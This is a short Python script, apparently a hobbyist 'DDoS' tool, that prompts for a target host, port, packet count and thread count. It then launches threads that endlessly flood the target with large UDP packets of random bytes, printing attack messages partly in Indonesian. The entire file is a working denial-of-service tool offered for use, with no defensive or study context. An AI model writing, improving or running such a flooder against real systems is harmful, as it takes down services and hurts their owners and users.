import random
import socket
import os,sys
import threading
import time


print("""\033[95m
 Tools By : CryssPlayZ
░█████╗░██████╗░██╗░░░██╗░██████╗░██████╗
██╔══██╗██╔══██╗╚██╗░██╔╝██╔════╝██╔════╝
██║░░╚═╝██████╔╝░╚████╔╝░╚█████╗░╚█████╗░
██║░░██╗██╔══██╗░░╚██╔╝░░░╚═══██╗░╚═══██╗
╚█████╔╝██║░░██║░░░██║░░░██████╔╝██████╔╝
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═════╝░
""")
print("\033[0m")
ip = str(input("[🗿] Host/Ip: "))
port = int(input("[🗿] Port: "))
choice = str(input("[🗿] GasDdos?(y/n): "))
times = int(input("[🗿] Packets: "))
threads = int(input("[🗿] Threads: "))
os.system("clear")
def Relaxs():
        ddos = random._urandom(65535)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(ddos,addr)
                        print(i +" \033[95mRelaxs Attack Ip %s Menindas Port %s\n" %(ip,port))
                except:
                        print("\033[91m[×] Down!!!")

def Relaxs2():
        ddos = random._urandom(615)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(ddos)
                        for x in range(times):
                                s.send(ddos)
                        print(i +" \033[95mRelaxs Attack Ip %s Menindas Port %s\n" %(ip,port))
                except:
                        s.close()
                        print("\033[91m[×] Down!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = Relaxs)
                th.start()
                th = threading.Thread(target = Relaxs2)
                th.start()

